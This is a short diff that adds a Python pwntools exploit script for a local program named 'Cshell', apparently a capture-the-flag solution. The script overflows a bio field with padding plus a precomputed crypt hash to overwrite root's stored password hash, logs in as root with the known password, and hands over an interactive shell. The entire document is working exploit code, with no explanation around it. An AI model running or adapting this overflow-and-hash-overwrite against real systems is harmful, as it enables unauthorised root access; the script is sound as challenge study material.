@@ -1,0 +1,26 @@
+from pwn import *
+#context.log_level="debug"
+p = process("./Cshell")
+p.recvuntil("long.")
+p.sendline("0x5a")
+p.recvuntil("password.")
+p.sendline("abc")
+
+p.recvuntil("?")
+p.sendline("120")
+p.recvuntil("bio.")
+log.info("Overflowing root's password hash with crypt(\"abc\",\"1337\")")
+gg = "A" * 187 + "13MqkfKmyTWBw"
+p.sendline(gg)
+p.recvuntil("> ")
+p.sendline("1")
+log.info("Logging in as root")
+p.recvuntil("name:")
+p.sendline("root")
+p.recvuntil("word:")
+p.sendline("abc")
+p.recvuntil("ted!")
+p.sendline("3")
+p.recvuntil(">")
+log.success("gg")
+p.interactive()
